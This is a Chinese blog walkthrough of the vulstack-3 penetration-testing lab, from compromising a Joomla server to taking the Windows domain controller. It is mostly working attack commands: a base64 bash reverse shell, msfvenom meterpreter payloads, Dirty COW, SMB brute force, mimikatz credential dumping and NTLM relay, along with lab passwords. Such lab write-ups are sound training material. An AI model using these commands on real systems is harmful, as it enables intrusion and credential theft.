<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="vulstack-3"/>




  <meta name="keywords" content="域渗透," />





  <link rel="alternate" href="/atom.xml" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/05/19/vulstack-3/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="vulstack-3">
<meta property="og:url" content="https://glotozz.github.io/2020/05/19/vulstack-3/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/05/20/9KNjmlCzYHygxQT.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/HjGoZAvBUgDIzKu.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/ZKnCyJUV95cEo83.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/8Nqd6Qa7xeH3XJG.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/t5NAM4a9UuSzygK.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/EomMI7AaSJuRrni.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/FezLqQHBi5TXJrd.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/nS8kgUJ2ZCVhpPO.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/l6DOjMUeuzY58E2.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/lJ8xp4dH2B9XqQM.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/xTZwApFUNkHYl9c.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/kELZW5gxnC7eqIN.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/IWEXPs17gCjMxRf.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/BWvJxDfRjNT7plA.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/e27UlfWCEbvQd5k.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/Wa8b3USfACNowR6.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/4GerXAv8yJtqRNU.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/YNGk3ZSOf7Rv2Wm.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/fKF7t4Au2qdoJiY.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/BUMR8OHc9gqk314.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/SE6wkq1jRZKgWcM.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/IX9fR7k6qBo48Z5.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/p89KysDlXbYrI4G.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/pFTLx3dIEQq4A21.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/i1kwRTbcWID5HhF.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/MynhNDw4z3lq8HX.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/dD9AjRs6YIc7oCe.png">
<meta property="og:image" content="https://i.loli.net/2020/05/20/Xk71S5RWCg98cv6.png">
<meta property="article:published_time" content="2020-05-19T08:02:47.000Z">
<meta property="article:modified_time" content="2020-05-20T15:08:05.612Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/20/9KNjmlCzYHygxQT.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> vulstack-3 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="glotozz'blog" type="application/atom+xml">
</head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          vulstack-3
        
      </h1>

      <time class="post-time">
          May 19 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#一-环境搭建">一、环境搭建</a></li>
<li><a href="#二-信息收集">二、信息收集</a></li>
<li><a href="#三-getshell">三、getshell</a></li>
<li><a href="#四-linux提权">四、linux提权</a></li>
<li><a href="#五-拿域控">五、拿域控</a><ul>
<li><a href="#思路一">思路一</a></li>
<li><a href="#思路二">思路二</a></li>
</ul>
</li>
<li><a href="#参考链接">参考链接</a></li>
</ul>
<!-- tocstop -->

<hr>
<h3><span id="一-环境搭建">一、环境搭建</span></h3><p>两台web机打开之后先保存个快照！！<br>我这里把出网机的桥接模式改成NAT模式，重启网络并将ip改回去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br><span class="line">ifconfig eth0 192.168.1.110 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>

<p>注意配置VMnat2的时候仅主机模式的主机连接去掉</p>
<p><img src="https://i.loli.net/2020/05/20/9KNjmlCzYHygxQT.png" alt="Snipaste_2020-05-20_10-30-01.png"></p>
<p><strong>DC</strong></p>
<p>IP：<code>192.168.93.10</code> OS：<code>Windows server 2012</code></p>
<p>应用：AD域</p>
<p><strong>WEB</strong></p>
<p>IP1：<code>192.168.1.110</code> IP2：<code>192.168.93.100</code> OS：<code>centos</code></p>
<p>应用：<code>joomla</code></p>
<p><strong>WEB2</strong></p>
<p>IP：<code>192.168.93.120</code> OS：<code>ubuntu</code></p>
<p>应用：<code>nginx反代</code></p>
<p><strong>PC</strong></p>
<p>IP1：<code>192.168.93.30</code> OS：<code>Windows 7</code></p>
<p><strong>PC2</strong></p>
<p>IP1：<code>192.168.93.20</code> OS：<code>Windows server 2008</code></p>
<h3><span id="二-信息收集">二、信息收集</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -T4 -A -p- 192.168.1.110</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/HjGoZAvBUgDIzKu.png" alt="Snipaste_2020-05-19_19-27-36.png"></p>
<p>80端口是<code>joomla</code>服务，3306是<code>mysql</code>数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.110 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-large-directories.txt -x .php,.txt,.html</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/ZKnCyJUV95cEo83.png" alt="Snipaste_2020-05-19_19-52-25.png"></p>
<h3><span id="三-getshell">三、getshell</span></h3><p><img src="https://i.loli.net/2020/05/20/8Nqd6Qa7xeH3XJG.png" alt="Snipaste_2020-05-19_19-54-16.png"></p>
<p>得到mysql连接账户密码</p>
<p><img src="https://i.loli.net/2020/05/20/t5NAM4a9UuSzygK.png" alt="Snipaste_2020-05-19_20-00-10.png"></p>
<p>john爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt flag</span><br></pre></td></tr></table></figure>

<p>爆破失败，考虑直接修改数据库密码</p>
<blockquote>
<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a> </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;am2zu_users&#96;</span><br><span class="line">   (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastResetTime&#96;)</span><br><span class="line">VALUES (&#39;Administrator2&#39;, &#39;admin2&#39;,</span><br><span class="line">    &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;, &#39;&#39;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO &#96;am2zu_user_usergroup_map&#96; (&#96;user_id&#96;,&#96;group_id&#96;)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#39;8&#39;);</span><br></pre></td></tr></table></figure>

<p>注意修改表前缀，使用<code>admin2/secret</code>登录后台</p>
<p>blog类型的一般是通过修改模版来getshell</p>
<p><img src="https://i.loli.net/2020/05/20/EomMI7AaSJuRrni.png" alt="Snipaste_2020-05-19_20-15-50.png"></p>
<p>访问主页<code>phpinfo()</code>执行成功，反弹shell失败，<code>phpinfo()</code>中存在<code>disable_func</code></p>
<p><img src="https://i.loli.net/2020/05/20/FezLqQHBi5TXJrd.png" alt="Snipaste_2020-05-19_20-21-23.png"></p>
<p>使用<code>ld_preload</code>来bypass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.110&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>命令执行成功，反弹sehll失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI4LzEyMzQgMD4mMQo&#x3D;|base64 -d|bash</span><br></pre></td></tr></table></figure>

<p>使用<code>PHP 7.0-7.4 disable_functions bypass</code></p>
<p>也是一样，命令执行成功但是无法反弹shell，迷，猜测是开了某种防护。</p>
<p>找到一个刻意的敏感文件</p>
<p><img src="https://i.loli.net/2020/05/20/nS8kgUJ2ZCVhpPO.png" alt="Snipaste_2020-05-19_22-24-59.png"></p>
<p>ssh连接<code>wwwuser/wwwuser_123Aqx</code></p>
<h3><span id="四-linux提权">四、linux提权</span></h3><p>这里的边界机是linux系统，可以尝试提权。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看是否存在其他用户</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#内核提权</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#登录mysql</span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查找sudo权限命令</span><br><span class="line">sudo -l</span><br><span class="line">#SUID权限可执行文件，没有可用的</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">#当前用户可写文件，发现一堆，但是极大多数都是没用的，所以我先把结果输出到文本文</span><br><span class="line">件，然后使用grep加上关键字去筛选。</span><br><span class="line">find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;tmp&#x2F;report.txt</span><br><span class="line">grep -Ev &#39;&#x2F;proc|&#x2F;sys&#39; &#x2F;tmp&#x2F;report.txt</span><br><span class="line">#查看计划任务</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">#查看邮件</span><br><span class="line">cd &#x2F;var&#x2F;mail&#x2F;</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/l6DOjMUeuzY58E2.png" alt="Snipaste_2020-05-19_22-38-53.png"></p>
<p><img src="https://i.loli.net/2020/05/20/lJ8xp4dH2B9XqQM.png" alt="Snipaste_2020-05-19_22-41-59.png"></p>
<blockquote>
<p>脏牛提权： <a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow/blob/master/dirty.c</a> </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">.&#x2F;dirty my-new-password</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/xTZwApFUNkHYl9c.png" alt="Snipaste_2020-05-19_23-10-29.png"></p>
<h3><span id="五-拿域控">五、拿域控</span></h3><h4><span id="思路一">思路一</span></h4><p>linux弹个msf，爆破smb服务，这个方法不提权也行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.128 LPORT&#x3D;1235 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.128</span><br><span class="line">set lport 1235</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>添加路由</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.1&#x2F;24</span><br><span class="line">background</span><br></pre></td></tr></table></figure>

<p>扫描周围windows信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhosts 192.168.93.1&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/kELZW5gxnC7eqIN.png" alt="Snipaste_2020-05-19_23-35-36.png"></p>
<p>尝试爆破一下windows server 2008的本地管理员</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;top1000.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>我去github上搜下了也没找到有这个密码的字典。。</p>
<p><img src="https://i.loli.net/2020/05/20/IWEXPs17gCjMxRf.png" alt="Snipaste_2020-05-20_00-03-57.png"></p>
<p>在爆破密码成功的基础上，</p>
<p>可以使用msf的<code>psexec</code>模块，执行失败</p>
<p><code>[-] 192.168.93.20:445 - Exploit failed: RubySMB::Error::UnexpectedStatusCode STATUS_USER_SESSION_DELETED</code></p>
<p>还可以先使用msf开个socks4正向代理，配合proxychains</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">set srvhost 192.168.1.128</span><br><span class="line">set srvport 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>或者ew的正向代理</p>
<p>用wmiexec执行命令，查看进程时发现有test域的administrator的进程，于是尝试抓一下密码(直接steal token也行)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python wmiexec.py -debug &#39;administrator:123qwe!ASD@192.168.93.20&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/BWvJxDfRjNT7plA.png" alt="Snipaste_2020-05-20_00-22-35.png"></p>
<p>信息收集</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all ------ 查询本机IP段，所在域等</span><br><span class="line">net user &#x2F;domain ------ 查询域用户</span><br><span class="line">net session ------ 查看当前会话</span><br><span class="line">tasklist &#x2F;svc ------ Windows进程对比杀软信息</span><br><span class="line">tasklist &#x2F;V ----- 查看进程[显示对应用户]</span><br><span class="line">whoami &#x2F;all ----- 查询当前用户权限等</span><br><span class="line">set ----- 查看系统环境变量</span><br><span class="line">systeminfo ----- 查看系统信息</span><br><span class="line">net view ----- 获取同一域的计算机列表</span><br><span class="line">nslookup test.lab</span><br><span class="line">net user ----- 域控才存在krbtgt</span><br><span class="line">net localgroup administrator</span><br><span class="line">netstat -ano ----- 观察pid是否establish</span><br><span class="line">03之前：netsh firewall set opmode disable</span><br><span class="line">03之后：netsh advfirewall set allprofiles state off</span><br><span class="line">查看防火墙配置：netsh firewall show config</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/e27UlfWCEbvQd5k.png" alt="Snipaste_2020-05-20_07-56-36.png"></p>
<p>域控为<code>192.168.93.10</code></p>
<p><img src="https://i.loli.net/2020/05/20/Wa8b3USfACNowR6.png" alt="Snipaste_2020-05-20_08-40-28.png"></p>
<p>发现<code>TEST域</code>的进程，可以尝试抓密码</p>
<p><img src="https://i.loli.net/2020/05/20/4GerXAv8yJtqRNU.png" alt="Snipaste_2020-05-20_08-40-56.png"></p>
<p>发现无杀软，用smbclient上传msf</p>
<p>生成，注意是边界机的域内ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.93.100 LPORT&#x3D;1236 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>需要开个frp转发端口，将kali的1236端口转发到边界机的1236</p>
<p>监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 1236</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient &#x2F;&#x2F;192.168.93.20&#x2F;c$ -U administrator</span><br><span class="line">dir</span><br><span class="line">put shell.exe</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python wmiexec.py -debug &#39;administrator:123qwe!ASD@192.168.93.20&#39;</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/05/20/YNGk3ZSOf7Rv2Wm.png" alt="Snipaste_2020-05-20_14-13-36.png"></p>
<p>没读到明文密码，上传一个<code>mimikatz.exe</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/fKF7t4Au2qdoJiY.png" alt="Snipaste_2020-05-20_14-23-25.png"></p>
<p>得到了域管理员的账号密码，</p>
<p>ipc连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.10\ipc$ zxcASDqw123!! &#x2F;user:administrator #失败,应该是没加上域</span><br><span class="line">net use \\192.168.93.10\admin$ zxcASDqw123!! &#x2F;user:test\administrator</span><br><span class="line">dir \\192.168.93.10\C$\users\administrator\Documents</span><br><span class="line">type \\192.168.93.10\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/05/20/BUMR8OHc9gqk314.png" alt="Snipaste_2020-05-20_14-57-40.png"></p>
<h4><span id="思路二">思路二</span></h4><p>从<code>smb_login</code>模块爆破失败开始，前面已知域中还存在3台windows，使用nmap扫端口</p>
<p><img src="https://i.loli.net/2020/05/20/SE6wkq1jRZKgWcM.png" alt="Snipaste_2020-05-20_15-54-50.png"></p>
<hr>
<p>1433端口是mssql，尝试之前mysql的账户密码<code>testuser cvcvgjASD!@</code></p>
<p>需要提权，安装<code>Responder</code>，并监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Responder.py -I eth1 -rv</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/IX9fR7k6qBo48Z5.png" alt="Snipaste_2020-05-20_20-25-42.png"></p>
<p> 使用<code>mssql_ntlm_stealer</code>，执行<code>xp_dirtree</code>，触发<code>UNC</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set smbproxy 192.168.93.100</span><br><span class="line">set rport 1433</span><br><span class="line">set username testuser</span><br><span class="line">set password cvcvgjASD!@</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/p89KysDlXbYrI4G.png" alt="Snipaste_2020-05-20_20-52-58.png"></p>
<p><img src="https://i.loli.net/2020/05/20/pFTLx3dIEQq4A21.png" alt="Snipaste_2020-05-20_20-53-10.png"></p>
<p>可惜没成功，没触发UNC，反而一直收到mssql服务的请求。。个人感觉是mssql的账户密码不对，但是去win2008测试又是正确的。。</p>
<blockquote>
<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/t/3560" target="_blank" rel="noopener">https://xz.aliyun.com/t/3560</a> </p>
<p><a href="https://www.jianshu.com/p/1b545a8b8b1e" target="_blank" rel="noopener">https://www.jianshu.com/p/1b545a8b8b1e</a> </p>
</blockquote>
<p>假如收到了<code>SMB</code>，可以尝试john爆破</p>
<p>…</p>
<p>为了测试，直接在win2008中使用ipc从而产生<code>SMB</code>请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.100\aaa</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/20/i1kwRTbcWID5HhF.png" alt="Snipaste_2020-05-20_22-05-39.png"></p>
<p>john爆破</p>
<p><img src="https://i.loli.net/2020/05/20/MynhNDw4z3lq8HX.png" alt="Snipaste_2020-05-20_22-11-45.png"></p>
<p>如果爆破失败，可以继续中继win2008打win7，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MultiRelay.py -t 192.168.93.30 -u ALL</span><br></pre></td></tr></table></figure>

<p>仍然用ipc连接测试，但是这里需要输入ipc连接的账户密码</p>
<p><img src="https://i.loli.net/2020/05/20/dD9AjRs6YIc7oCe.png" alt="Snipaste_2020-05-20_22-54-00.png"></p>
<p>没有成功</p>
<p><img src="https://i.loli.net/2020/05/20/Xk71S5RWCg98cv6.png" alt="Snipaste_2020-05-20_22-52-52.png"></p>
<p>最主要还是msf中的<code>mssql_ntlm_stealer</code>模块没有成功，而且之前msf的mimikatz模块也没有成功，可能是我的msf有问题。。</p>
<hr>
<h3><span id="参考链接">参考链接</span></h3><p> <a href="https://xz.aliyun.com/t/6988" target="_blank" rel="noopener">https://xz.aliyun.com/t/6988</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
    
      <a class="next" href="/2020/05/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-wp2/">
        <span class="next-text nav-default">网鼎杯-wp2</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
